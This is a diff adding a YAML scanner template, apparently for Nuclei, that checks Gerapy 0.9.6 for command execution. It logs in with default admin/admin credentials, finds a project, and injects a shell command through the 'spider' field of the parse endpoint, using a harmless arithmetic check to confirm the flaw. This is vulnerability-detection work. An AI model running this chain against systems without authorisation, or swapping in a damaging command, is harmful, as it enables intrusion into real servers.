@@ -1,0 +1,82 @@
+id: gerapy-crawler-parse-rce
+info:
+  name: Gerapy 0.9.6 Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+
+variables:
+  t1: "{{rand_int(111000, 999000)}}"
+  t2: "{{rand_int(10, 100)}}"
+  t3: "{{to_number(t1) - to_number(t2)}}"
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: auth
+    method: POST
+    path:
+      - "{{BaseURL}}/api/user/auth"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {"username":"admin","password":"admin"}
+    extractors:
+      - type: json
+        name: token
+        internal: true
+        json:
+          - '.token'
+    matchers:
+      - type: status
+        status: [200]
+
+  - id: project-index
+    method: GET
+    path:
+      - "{{BaseURL}}/api/project/index"
+    headers:
+      Authorization: "Token {{token}}"
+    extractors:
+      - type: json
+        name: name
+        internal: true
+        json:
+          - '.[0].name'
+    matchers:
+      - type: status
+        status: [200]
+
+  - id: project-build
+    method: GET
+    path:
+      - "{{BaseURL}}/api/project/{{name}}/build"
+    headers:
+      Authorization: "Token {{token}}"
+    extractors:
+      - type: json
+        name: id
+        internal: true
+        json:
+          - '.id'
+    matchers:
+      - type: status
+        status: [200]
+
+  - id: command-execution
+    method: POST
+    path:
+      - "{{BaseURL}}/api/project/{{id}}/parse"
+    headers:
+      Content-Type: application/json
+      Authorization: "Token {{token}}"
+    body: |-
+      {"spider":";`expr {{t1}} - {{t2}}`"}
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "{{t3}}"
+        part: body
